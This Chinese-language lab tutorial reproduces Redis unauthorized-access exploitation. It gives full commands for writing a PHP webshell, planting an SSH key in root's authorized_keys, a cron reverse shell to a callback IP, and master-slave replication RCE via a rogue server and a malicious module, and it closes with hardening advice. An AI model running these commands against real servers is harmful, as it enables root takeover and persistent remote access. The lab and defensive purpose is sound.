**声明：**  
本文仅用作学习交流，所有流程全部由本地环境完成。任何人禁止使用相关技术和工具对真实目标进行未授权测试，产生的所有后果由当事人自行承担。

 **简介：**  
REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value
存储系统，是跨平台的非关系型数据库。

Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。

Redis
通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted
sets)等类型。

redis存在配置不当导致的未授权访问，本文将演示redis的安装，然后复现redis漏洞。并在文章末附上防护方案。

 **演示环境：**

操作系统：ubuntu18.04因为ubuntu利用比较难，所以这里尝试ubuntu复现  
redis测试版本：  
redis5.0.5  
我和大家一起从安装开始踩坑避坑。

 **安装：**

先给虚拟机拍摄快照，以后遇到问题直接恢复系统：  
![1.png](https://image.3001.net/images/20220226/1645836638_6219795e534e5556766ec.png!small)  
安装vmtools后，可以拖拽文件至虚拟机，进虚拟机后解压redis压缩包：

    
    
    tar xvf redis-3.2.0.tar.gz
    x 从档案文件中释放文件。
    f 使用档案文件或设备，这个选项通常是必选的。
    v 详细报告tar处理的文件信息。如无此选项，tar不报告文件信息。
    

![2.png](https://image.3001.net/images/20220226/1645836946_62197a92b0b13fe9e8db5.png!small)  
redis安装运行需要使用make、gcc、tcl8.5以上，如果电脑没有make，可以先换源，如果你的源没有make或者存在连接不上，速度过慢等问题。我找到一个可以正常使用的源。

执行命令：  
nano /etc/apt/sources.list  
将下面链接复制进去，编辑完ctrl+x保存

    
    
    执行命令：
    nano /etc/apt/sources.list
    将下面链接复制进去，编辑完ctrl+x保存
    # 阿里云源
    deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
    deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe $
    deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe m$
    deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe$
    ##測試版源
    deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe $
    # 源碼
    deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multi$
    deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted unive$
    deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted univer$
    deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted univ$
    ##測試版源
    deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted unive$
    
    
    # 清华大学源
    deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe$
    deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted$
    deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted $
    deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricte$
    ##測試版源
    deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted$
    # 源碼
    deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted univ$
    deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restri$
    deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restric$
    deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restr$
    ##測試版源
    deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restri$
    

然后安装make和gcc

    
    
    sudo apt-get update
    sudo apt-get install make
    sudo apt-get install gcc
    sudo apt-get install tcl
    

修改文件夹权限，进入目录安装：

    
    
    chmod 777 redis-3.2.0 cd redis-3.2.0 make
    

如果出现：fatal error: jemalloc/jemalloc.h: No such file or directory  
![3.png](https://image.3001.net/images/20220226/1645837143_62197b570d9e0729374ff.png!small)

说明存在残余缓存，执行命令：

    
    
    make distclean  && make
    

![4.png](https://image.3001.net/images/20220226/1645837190_62197b86e645f23b1ed69.png!small)

他推荐测试一下，咱们试试，这里我安装了tcl8.5，不然无法运行。

    
    
    make test
    

![5.png](https://image.3001.net/images/20220226/1645837241_62197bb9dcd5e8efcbc0a.png!small)

运行测试有时会出现warning，但是依旧可以使用。

 **运行：**

运行redis之前需要先修改配置文件，配置在解压目录下redis.conf  
![6.png](https://image.3001.net/images/20220226/1645837391_62197c4fe6882a9b43294.png!small)

没有写权限，先增加权限

    
    
    chmod 777 redis.conf
    

然后打开，找到bind 127.0.0.1，注释掉这句话：  
![7.png](https://image.3001.net/images/20220226/1645837421_62197c6d2b0f02b756de1.png!small)

然后关闭protected-mode：  
![8.png](https://image.3001.net/images/20220226/1645837441_62197c818b0a8da65fcea.png!small)

把配置文件复制进src，运行src目录下的redis_server，命令如下：  
![9.png](https://image.3001.net/images/20220226/1645837490_62197cb24846b1645356b.png!small)

    
    
    sudo ./redis-server redis.conf
    

bind ip这个配置代表，只有绑定的ip才允许访问redis端口，否则会拒绝。

protected-mode打开代表禁止远程ip连接数据库，所以远程访问redis有两个选择：

1、bind可信ip

2、直接关闭安全保护

 **漏洞复现：**

这里选择直接关闭安全防护，关闭bind ip。

然后远程连接：

如果本地也有redis，可以使用src文件夹的redis-cli，在src目录下执行make命令，即可编译：  
![10.png](https://image.3001.net/images/20220226/1645837552_62197cf05834ca9985358.png!small)

登录目标：

    
    
    redis-cli -h {host} -p {port} -a {password}
    

如果本地没有redis，可以直接使用kali中telnet：

3.2.0复现成功：  
![11.png](https://image.3001.net/images/20220226/1645837601_62197d217e7370f636216.png!small)

4.0.8复现成功：  
![12.png](https://image.3001.net/images/20220226/1645837618_62197d3229ef9e1818c71.png!small)

5.0.5复现成功：  
![13.png](https://image.3001.net/images/20220226/1645837623_62197d37a870be24db050.png!small)

 **后续利用：**  
 **一、redis未授权写webshell**

利用条件：

1.存在未授权访问或弱口令  
2.redis以root运行

web环境强烈建议直接phpstudy linux版一键无脑安装。  
然后启动redis，我这里启动的是5.0.5版本，远程登录redis

    
    
    1.info //查看信息
    2.flushall //删除所有内容
    3.flushdb //刷新数据库
    4.keys * //查看所有键 配合select看值
    5.set test “who am i” //设置键test的值为who am i
    6.config set dir dirpath //设置路径
    7.config get dir/dbfilename //获取路径等信息
    8.save //保存
    9.get //查看变量值
    

写webshell:

    
    
    config set dir /var/www/html
    set chanra "<?php phpinfo();?>"
    config set dbfilename "chanra.php"
    save
    

这里需要闭合，因为后面会跟上一些缓存数据，php解析后会报错。  
![14.png](https://image.3001.net/images/20220226/1645838219_62197f8b15d15b3d1ba52.png!small)

查看靶机是否被写入文件：  
![15.png](https://image.3001.net/images/20220226/1645838235_62197f9b8bf1816a5c78a.png!small)

查看文件：  
![16.png](https://image.3001.net/images/20220226/1645838247_62197fa7f4072eb3632ff.png!small)

web访问，需要php解析环境，可以看到代码已经执行。  
![17.png](https://image.3001.net/images/20220226/1645838283_62197fcb5b6decfeec970.png!small)

改写webshell进去：  
![18.png](https://image.3001.net/images/20220226/1645838288_62197fd0ef3ed58911994.png!small)

可以看到已经覆盖了原本文件的数据：  
![19.png](https://image.3001.net/images/20220226/1645838305_62197fe1aa236d9ab92b2.png!small)

蚁剑连接成功：  
![20.png](https://image.3001.net/images/20220226/1645838309_62197fe5e8f3d5bfbe1e2.png!small)

 **二、未授权访问连接ssh**

利用条件：

1.存在未授权访问或弱口令  
2.redis以root运行

ssh除了常规的密码登录，还可以使用密钥登录，这里利用redis写进我们自己的ssh密钥到目标主机，使目标接受我们的控制。

本地生成密钥：

    
    
    ssh-keygen -t rsa
    

![21.png](https://image.3001.net/images/20220226/1645838420_62198054a0bddaed83831.png!small)

为了防止和里面其他数据拼接报错，所以密钥前后各加了换行符：

    
    
    config set dir /root/.ssh
    config set dbfilename authorized_keys
    set chanra "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCyh/65AAPcbM/WyM3mrHJYLA+vKpHCmKMfSXhufw1xDH+CMCYUYF/LNMHTQu8RggkQ3eJ0oENEpWUH9E7QfQRL5ARDc3XX/xR6qo+igvclEoEBIJi6xOCKC5y266IkKTHG1PtxTrQ4cY6pu++Bn+ad7vN3vu+B/xZAXDE7GSAxh9A79fQaucS7wGTxnIbt4soia5B9SZoGSXbBeMupI5uKiifL2IROHopzmccy4v4Kn5/NmTvximmXLhlVsA0CiQwtubRAKdhSN93nCikcCqeKBXEL5ng1S3HOm+ZdBhAcCH0Vsto+l5zzyhVLXHkx1Ys9iQc5GQaoD9lNTiEVUoisdx0u7Zr5ZRwrgIWECq6dieuNJ3fHKCegIKCcPAI0yeiSj+OfhRl66JXBA3fo+c4e2mA+AHpUuedwbRDpdO+gEumPvNlPXOL2WSaoKqTEHIUAfLjtGpmIulbazlJANFSX2rvZ9bA3K1TuxuS6fPWeEHH3ij6PWY0hFIKsX4N3RE= root@kali\n\n"
    save
    

有的系统可能没有/root/.ssh的目录，似乎用root登录一次就会有了，ssh上线成功，没有输入密码直接拿到目标root的shell。  
![22.png](https://image.3001.net/images/20220226/1645838443_6219806b7f73885ab650e.png!small)

 **三、计划任务反弹shell**

每分钟反弹一次shell到我本机，实战需要公网ip

    
    
    config set dir /var/spool/cron 
    config set dbfilename root
    set chanra "\n\n\n * * * * * /bin/bash -i >& /dev/tcp/192.168.2.174/7777 0>&1\n\n\n"
    save
    

这里一共5个*号  
第一个是分钟，*是每分钟  
第二个是小时，*是每小时  
第三个是一个月的天数，*是每日  
第四个是月，*是每月  
第五个是一周七天，*是一周七天  
更详细的可以百度linux计划任务  
然后nc监听：

    
    
    nc -lvp 7777
    

理论上马上就会反弹shell，但是实际上行不通，换了centos尝试，先打开防火墙：

    
    
    firewall-cmd --query-port=6379/tcp //查询端口状态
    firewall-cmd --permanent --add-port=6379/tcp //放行6379
    firewall-cmd --reload //重启防火墙
    firewall-cmd --query-port=6379/tcp //查询端口状态
    

![23.png](https://image.3001.net/images/20220226/1645838580_621980f40f636e555956e.png!small)

cent os 7反弹成功：  
![24.png](https://image.3001.net/images/20220226/1645838584_621980f86e9f622fc9b51.png!small)

因为centos7是直接执行计划任务文件，且默认执行命令的为/bin/bash。

ubuntu要执行有三点：

1、ubuntu的默认执行命令的为/bin/dash，我们使用bash -i肯定是弹不了的。执行命令修改默认shell。

    
    
    ln -s -f /bin/bash /bin/sh
    

2、ubuntu计划任务运行有语法要求，redis写入的文件存在缓存数据，导致语法错误无法运行计划任务。需要手动清除文件乱码，语法格式正确。

3、文件需要是600 rw权限，权限不对也不能运行，不过我直接写入貌似也是600 rw。

条件全部满足后反弹shell成功：  
![25.png](https://image.3001.net/images/20220226/1645838673_62198151501c27b9873e2.png!small)

 **四、主从复制RCE**  
实际情况下，如果遇到了目标只开启了6379端口，ssh无法利用，而且没启动计划任务，就可以利用主从复制getshell。主从复制rce指的是，我们攻击者伪装成可信机器，和被害主机通信同步，加载恶意的so文件，执行命令。  
我们只要知道目标的密码，或者目标存在未授权即可执行。  
下载链接：

    
    
    https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server 
    
    python3 redis_rogue_server.py -rhost 192.168.2.193 -lhost 192.168.2.174 -lport 12345
    

执行脚本，rhost是受害ip，lhost是攻击者，lport是攻击机用于通信的端口。  
![26.png](https://image.3001.net/images/20220226/1645839033_621982b96a0a86ec4221b.png!small)

 **五、目标本地redis主从复制RCE**

这个洞不是很会利用，只想到下面场景：  
假如目标bind本地ip，且渗透时拿到了对方低权限用户的shell，而redis是以高权限运行。可以利用目标的redis进行RCE获得高权限。

先在攻击机启动恶意redis服务：

    
    
    python3 redis_rogue_server.py -v -lport 15000 -path exp.so
    

反弹一个低权限shell，然后本地登录redis，准备写入恶意so文件：

    
    
    config set dir /tmp 
    config set dbfilename exp.so
    slaveof 192.168.2.174 15000
    

![27.png](https://image.3001.net/images/20220226/1645839434_6219844a59ca8af8c40af.png!small)

已经同步到目标目录：  
![28.png](https://image.3001.net/images/20220226/1645839443_62198453a7c7a8a281df0.png!small)

加载恶意模块：

    
    
    module load /tmp/exp.so
    module list
    

![29.png](https://image.3001.net/images/20220226/1645839451_6219845b62302dfaa634f.png!small)

反弹shell:

    
    
    system.rev 192.168.2.174 7778
    

![30.png](https://image.3001.net/images/20220226/1645839462_62198466aa898bd2158cf.png!small)

得到root权限，这样我们就从普通用户提权到root用户，然后就可以为所欲为了。

 **安全防护方案：**

1、bind可信ip地址，只允许指定ip访问。

2、设置requirepass，添加登录密码。

3、开启protected-mode，使用安全模式。

4、将默认的6379端口修改。

5、使用低权限用户运行redis，最好单独添加一个低权限用户。

修改完配置文件后，需要重新启动redis，才可以生效。

